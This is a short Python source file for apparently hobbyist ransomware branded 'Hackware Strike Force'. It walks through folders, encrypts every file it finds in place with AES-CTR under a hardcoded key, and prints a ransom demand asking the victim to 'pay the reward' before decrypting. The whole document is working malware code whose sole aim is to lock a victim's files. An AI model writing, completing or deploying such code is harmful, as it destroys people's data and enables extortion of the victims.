import PathFolderArchives

from Crypto.Cipher import AES
from Crypto.Util import Counter


KEY_CRYPT = 'hackware strike force strikes u!'

def change_files(filename, cryptoFn, block_size=16):
    with open(filename, 'r+b') as _file:
        raw_value = _file.read(block_size)
        while raw_value:
            cipher_value = cryptoFn(raw_value)

            if len(raw_value) != len(cipher_value):
                raise ValueError(f'O arquivo cifrado {len(cipher_value)} tem um tamanho diferente do tamanho original {len(raw_value)}')
            
            _file.seek(- len(raw_value), 1)
            _file.write(cipher_value)
            raw_value = _file.read(block_size)


def create_cipher(key):
    counter_block_object = Counter.new(128)
    cipher = AES.new(key, AES.MODE_CTR, counter=counter_block_object)
    return cipher


def encrypt(path):
    key_bits = KEY_CRYPT.encode()
    cipher = create_cipher(key_bits)
    for current_folder in path:
        for archive_name in PathFolderArchives.discover(current_folder):
                change_files(archive_name, cipher.encrypt)

    


def decrypt(path):
    print(f'''
                HACKWARE STRICE FORCE
                ----------------------------------
                ----------------------------------

                YOUR FILES HAVE BENN ENCRYPTED.

                TO DECRIPTE THEM PAY THE REWARD

                or use the key [{KEY_CRYPT}]''')
                
    key_bits = input('Type the key > ').encode()
    cipher = create_cipher(key_bits)
    for current_folder in path:
        for archive_name in PathFolderArchives.discover(current_folder):
                change_files(archive_name, cipher.decrypt)

    





